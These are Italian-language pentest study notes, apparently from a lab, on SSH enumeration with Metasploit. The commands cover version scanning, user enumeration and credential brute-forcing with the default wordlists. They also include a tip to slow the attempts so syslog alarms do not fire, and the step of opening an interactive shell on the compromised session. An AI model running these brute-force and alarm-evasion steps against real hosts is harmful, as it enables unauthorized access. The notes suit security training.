# SSH Enumeration

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
service postgresql start
msfconsole
workspace -a SSH_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:ssh
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## SSH version enumeration

```
use auxiliary/scanner/ssh/ssh_version
run
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vediamo la versione di SSH e il sistema operativo e verso il fondo della seconda riga vediamo anche la versione del SO (Ubuntu 19.04)

## SSH bruteforce delle credenziali

```
use auxiliary/scanner/ssh/ssh_version  // se il target usa l'autenticazione via user e password
use auxiliary/scanner/ssh/ssh_login    // se il target usa l'autenticazione con chiave public/private
show options
// meglio ridurre la BRUTEFORCE_SPEED perché i log di solito vengono inviati a un Sys Log Server e quindi potrebbe scattare qualche allarme
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt //oppure unix_passwords.txt
run
// terminiamo la sessione aperta automaticamente con CTRL+C
sessions
session 1
/bin/bash -i   // per aprire una shell interattiva nella sessione 1

```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Questo modulo apre in automatico anche un terminale con SSH sul target, però in realtà se proviamo a scrivere qualche comando non funziona, quindi bisogna terminarlo con CTRL+C e poi se scriviamo il comando sessions possiamo vedere che ne ha attivata una in automatico al posto nostro:

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Però se poi entriamo nella sessione attiva e scriviamo ls non vediamo il risultato, allora dobbiamo aprire una shell interattiva con il comando /bin/bash -i

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## SSH Users enumeration

```
use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

E ci mostra la lista degli utenti, in cui possiamo trovare sysadmin che abbiamo scoperto prima. Di solito meglio eseguire prima questo e poi testare le password (con ssh\_login) sugli utenti trovati.

<figure><img src="../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
